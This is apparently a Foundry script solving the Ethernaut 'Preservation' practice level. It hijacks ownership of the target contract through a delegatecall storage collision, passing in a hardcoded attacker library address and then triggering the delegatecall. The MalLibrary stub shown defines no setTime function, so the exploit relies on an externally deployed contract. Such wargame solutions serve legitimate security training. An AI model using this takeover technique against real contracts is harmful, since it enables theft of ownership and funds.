// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Preservation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract MalLibrary {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
}

contract PreservationSolution is Script {
    Preservation pre = Preservation(0x0Ec12EFb5D3D9222792A1D171cF5F6E012cd9790);

    function run() external {
        vm.startBroadcast();
        pre.setSecondTime(
            uint256(uint160(0x9C3878ee6a682B4d2bf8f6f2fCAc61d5BB9C4712))
        );
        pre.setFirstTime(12345678);
        vm.stopBroadcast();
    }
}
